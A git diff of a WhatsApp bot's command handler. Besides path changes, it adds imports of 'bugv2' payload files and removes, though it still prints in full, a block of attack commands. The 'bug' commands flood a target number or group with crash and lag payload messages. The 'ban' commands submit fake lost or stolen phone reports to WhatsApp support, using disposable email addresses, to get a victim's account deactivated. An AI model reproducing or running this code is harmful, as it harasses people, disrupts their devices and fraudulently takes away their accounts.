@@ -97,29 +97,37 @@ const {
     getAllPremiumUser,
 } = require('./lib/premiun')
 //data
-let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'))
-let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
-let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
-const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
+let ntnsfw = JSON.parse(fs.readFileSync('./lib/src/data/function/nsfw.json'))
+let bad = JSON.parse(fs.readFileSync('./lib/src/data/function/badword.json'))
+let premium = JSON.parse(fs.readFileSync('./lib/src/data/role/premium.json'))
+const owner = JSON.parse(fs.readFileSync('./lib/src/data/role/owner.json'))
 //media
-const VoiceNoteXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/togevn.json'))
-const StickerXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/togesticker.json'))
-const ImageXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/togeimage.json'))
-const VideoXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/togevideo.json'))
-const DocXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/doc.json'))
-const ZipXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/zip.json'))
-const ApkXeon = JSON.parse(fs.readFileSync('./TogeMedia/database/apk.json'))
+const VoiceNoteXeon = JSON.parse(fs.readFileSync('./lib/database/vn.json'))
+const StickerXeon = JSON.parse(fs.readFileSync('./lib/database/sticker.json'))
+const ImageXeon = JSON.parse(fs.readFileSync('./lib/database/image.json'))
+const VideoXeon = JSON.parse(fs.readFileSync('./lib/database/video.json'))
+const DocXeon = JSON.parse(fs.readFileSync('./lib/database/doc.json'))
+const ZipXeon = JSON.parse(fs.readFileSync('./lib/database/zip.json'))
+const ApkXeon = JSON.parse(fs.readFileSync('./lib/database/apk.json'))
 
 //bug database
-const { xeontext1 } = require('./src/data/function/XBug/xeontext1')
-const { xeontext2 } = require('./src/data/function/XBug/xeontext2')
-const { xeontext3 } = require('./src/data/function/XBug/xeontext3')
-const { xeontext4 } = require('./src/data/function/XBug/xeontext4')
-const { xeontext5 } = require('./src/data/function/XBug/xeontext5')
+const { bugtext1 } = require('./lib/src/data/function/bugv2/bugtext1')
+const { bugtext2 } = require('./lib/src/data/function/bugv2/bugtext2')
+const { bugtext3 } = require('./lib/src/data/function/bugv2/bugtext3')
+const { bugtext4 } = require('./lib/src/data/function/bugv2/bugtext4')
+const { bugtext5 } = require('./lib/src/data/function/bugv2/bugtext5')
+const { bugtext6 } = require('./lib/src/data/function/bugv2/bugtext6')
+const { bugtext7 } = require('./lib/src/data/function/bugv2/bugtext7')
+const { bugtext8 } = require('./lib/src/data/function/bugv2/bugtext8')
+const { bugtext9 } = require('./lib/src/data/function/bugv2/bugtext9')
+const { bugtext10 } = require('./lib/src/data/function/bugv2/bugtext10')
+const wkwk = fs.readFileSync(`./lib/src/data/function/bugv2/x.mp3`)
+const xsteek = fs.readFileSync(`./lib/src/data/function/bugv2/x.webp`)
+const o = fs.readFileSync(`./lib/src/data/function/bugv2/o.jpg`)
 
-const xeonverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
+const xeonverifieduser = JSON.parse(fs.readFileSync('./lib/src/data/role/user.json'))
 
-global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
+global.db.data = JSON.parse(fs.readFileSync('./lib/src/database.json'))
 if (global.db.data) global.db.data = {
 sticker: {},
 database: {}, 
@@ -240,27 +248,27 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
         
         //theme sticker reply
         const XeonStickWait = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/wait.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/wait.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         const XeonStickAdmin = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/admin.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/admin.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         const XeonStickBotAdmin = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/botadmin.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/botadmin.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         const XeonStickOwner = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/owner.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/owner.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         const XeonStickGroup = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/group.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/group.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         const XeonStickPrivate = () => {
-        let XeonStikRep = fs.readFileSync('./TogeMedia/theme/sticker_reply/private.webp')
+        let XeonStikRep = fs.readFileSync('./lib/theme/sticker_reply/private.webp')
         XeonBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m })
         }
         //premium
@@ -287,7 +295,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
                             title: botname,
                             body: ownername,
                             previewType: "PHOTO",
-                            thumbnail: fs.readFileSync('./TogeMedia/theme/togepic.jpg'),
+                            thumbnail: fs.readFileSync('./lib/theme/pic.jpg'),
                             sourceUrl: wagc
                         }
                     },
@@ -303,7 +311,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
                         showAdAttribution: true,
                         title: botname,
                         body: ownername,
-                        thumbnail: fs.readFileSync('./TogeMedia/theme/togepic.jpg'),
+                        thumbnail: fs.readFileSync('./lib/theme/pic.jpg'),
                         sourceUrl: websitex,
                         mediaType: 1,
                         renderLargerThumbnail: true
@@ -594,7 +602,7 @@ var xeonlod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
+"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ..."
 ]
 let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
@@ -2985,7 +2993,7 @@ mentionedJid:[sender],
 "title": botname, 
 "containsAutoReply": true,
 "mediaType": 1, 
-"thumbnail": fs.readFileSync("./TogeMedia/theme/togepic.jpg"),
+"thumbnail": fs.readFileSync("./lib/theme/pic.jpg"),
 "mediaUrl": `${wagc}`,
 "sourceUrl": `${wagc}`
 }
@@ -8827,870 +8835,239 @@ break
             }
             break
             
-            //bug && war cases 
-//⚠️do not edit cases otherwise bug not work
-//bug cases 
-case 'amountbug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-break
-case 'pmbug' :{
- if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
- await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'delaybug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'docubug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'unlimitedbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'bombug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'lagbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'trollybug': {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'gcbug' : {
-if (!isPremium) return replygcxeon(mess.premium)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'delaygcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext5
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'laggcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'bomgcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await haikal.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'unlimitedgcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'trollygcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'docugcbug' :  {
-if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JQ4s2pJuBReE7YL9wKJPHo `)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-} 
-break
-
-//ban/unban cases
-case 'out': case 'verif':{
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/roubado: desative minha conta")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv1': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv2': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv3': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
-XeonBotInc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
-}
-break
-case 'banv4': {
-if (!isPremium) return replyprem(mess.premium)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 13038480418`)
-let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
-let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx)
-if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
-let axioss = require("axios")  
-let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
-let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
-let cookie = xeonxos.headers["set-cookie"].join("; ")
-const cheerio = require('cheerio');
-let $ = cheerio.load(xeonxos.data)
-let $form = $("form");
-let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
-let form = new URLSearchParams()
-form.append("jazoest", $form.find("input[name=jazoest]").val())
-form.append("lsd", $form.find("input[name=lsd]").val())
-form.append("step", "submit")
-form.append("country_selector", "INDIA")
-form.append("phone_number", xeonnumx)
-form.append("email", email.data[0])
-form.append("email_confirm", email.data[0])
-form.append("platform", "ANDROID")
-form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
-form.append("__user", "0")
-form.append("__a", "1")
-form.append("__csr", "")
-form.append("__req", "8")
-form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
-form.append("dpr", "1")
-form.append("__ccg", "UNKNOWN")
-form.append("__rev", "1006630858")
-form.append("__comment_req", "0")
-let res = await axioss({
-  url,
-  method: "POST",
-  data: form,
-  headers: {
-  cookie
-}
-})
